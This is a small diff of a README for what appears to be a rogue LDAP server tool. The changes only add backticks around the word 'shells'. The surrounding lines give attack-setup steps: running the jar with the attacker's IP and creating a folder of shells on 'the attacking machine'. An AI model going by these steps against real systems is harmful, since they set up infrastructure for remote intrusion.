@@ -75,14 +75,14 @@ java -jar RogueLDAP-1.4-SNAPSHOT.jar -i <YOUR-IP-ADDRESS>
  
 ```
 
-3. create a folder called shells at a preffered location at the attacking machine
+3. create a folder called `shells` at a preffered location at the attacking machine
 
 ```
 mkdir shells 
 cd shells 
 ```
 
-4. Inside the shells folder create an ```index.html``` file 
+4. Inside the `shells` folder create an ```index.html``` file 
 
 ```
 touch index.html 
